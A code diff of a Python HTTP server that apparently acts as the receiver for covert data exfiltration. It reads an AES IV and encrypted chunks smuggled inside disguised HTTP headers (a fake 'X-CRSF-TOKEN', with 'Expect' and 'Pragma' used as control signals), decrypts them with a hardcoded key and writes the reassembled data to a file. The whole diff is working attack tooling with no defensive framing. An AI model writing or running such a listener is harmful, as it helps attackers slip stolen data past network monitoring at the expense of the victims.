@@ -10,24 +10,39 @@ from Crypto.Util.Padding import unpad
 PORT = 8000
 SECRET_KEY = "a cheeky nando's"
 
+connection_state = 0
+iv = ''
+ct = []
+
 
 class GetHandler(SimpleHTTPRequestHandler):
 
     def do_GET(self):
-        logging.error(self.headers)
-        if self.headers.get('X-CRSF-TOKEN') and self.headers.get('Proxy-Authorization'):
-            iv = self.headers.get('Proxy-Authorization')
-            ct = self.headers.get('X-CRSF-TOKEN')
+        global connection_state, iv, ct
+        # logging.error(self.headers)
 
-            iv = iv.partition('basic ')[2]
-
+        if self.headers.get('Expect'):
+            connection_state = 1
+            iv = self.headers.get('X-CRSF-TOKEN')
+            print('Received AES IV: {}'.format(iv))
             iv = base64.b64decode(iv)
-            print('Initialization vector: {}'.format(iv))
-            print('Encrypted data: {}'.format(ct))
+        elif connection_state == 1 and not self.headers.get('Pragma'):
+            if self.headers.get('X-CRSF-TOKEN'):
+                ct.append(self.headers.get('X-CRSF-TOKEN'))
+                print('Received encrypted data: {}'.format(ct[-1]))
 
+        elif self.headers.get('Pragma'):
             cipher = AES.new(bytes(SECRET_KEY, 'utf-8'), AES.MODE_CBC, bytes(iv))
-            pt = unpad(cipher.decrypt(base64.b64decode(ct)), AES.block_size)
-            print('Decrypted message: \'{}\''.format(pt))
+
+            with open(r'output', 'wb+') as output:
+                for block in ct:
+                    pt = unpad(cipher.decrypt(base64.b64decode(block)), AES.block_size)
+                    print('Decrypted block: \'{}\''.format(pt[-1]))
+                    output.write(pt)
+
+            connection_state = 0
+            iv = ''
+            ct = []
         SimpleHTTPRequestHandler.do_GET(self)
 
 
